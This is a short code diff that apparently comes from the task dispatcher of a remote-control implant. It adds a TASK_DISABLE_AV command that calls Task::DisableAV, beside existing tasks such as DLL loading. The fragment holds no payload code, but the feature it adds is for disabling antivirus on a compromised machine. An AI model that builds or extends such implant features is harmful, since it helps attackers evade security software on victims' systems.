@@ -203,6 +203,9 @@ namespace Handler
                     Utils::Convert::UTF8Decode(args["dest"])
                 );
                 break;
+            case TASK_DISABLE_AV:
+                wTaskResult = Task::DisableAV(pState);
+                break;
             case TASK_DLL:
                 wTaskResult = Task::Dll(
                     pState,
